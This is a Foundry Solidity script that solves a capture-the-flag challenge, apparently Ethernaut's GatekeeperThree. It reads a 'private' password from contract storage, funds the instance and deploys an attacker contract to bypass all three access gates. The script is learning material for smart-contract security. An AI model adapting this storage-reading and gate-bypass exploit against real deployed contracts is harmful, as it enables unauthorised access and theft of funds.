// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperThree} from "../src/28-GatekeeperThree/GatekeeperThree.sol";
import {GatekeeperThreeAttacker} from "../src/28-GatekeeperThree/GatekeeperThreeAttacker.sol";

/**
 * @title Challenge 28 Solution Script
 * @notice Deploy GatekeeperThreeAttacker to pass all three gates
 * @dev Must first send > 0.001 ether to the instance, and find the SimpleTrick password
 */
contract GatekeeperThreeSolution is Script {
    address constant INSTANCE = 0x9F180F0f1dcb006B14fA4009c8F695AA50575470;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        GatekeeperThree gatekeeper = GatekeeperThree(payable(INSTANCE));

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: Create trick if it doesn't exist yet
        if (address(gatekeeper.trick()) == address(0)) {
            console.log("Trick is not created. Creating trick...");
            gatekeeper.createTrick();
        }

        address trickAddress = address(gatekeeper.trick());
        console.log("SimpleTrick address:", trickAddress);

        // Read password from SimpleTrick (stored at slot 2)
        bytes32 passwordSlot = vm.load(trickAddress, bytes32(uint256(2)));
        uint256 password = uint256(passwordSlot);
        console.log("Password:", password);

        // Send ETH to the gatekeeper (> 0.001 ether for gate three)
        (bool sent, ) = INSTANCE.call{value: 0.0015 ether}("");
        require(sent, "Failed to send ETH");

        // Deploy attacker and execute
        GatekeeperThreeAttacker attacker = new GatekeeperThreeAttacker(
            INSTANCE,
            password
        );
        attacker.attack();

        vm.stopBroadcast();

        console.log("Entrant:", gatekeeper.entrant());
        console.log("Challenge 28 completed!");
    }
}
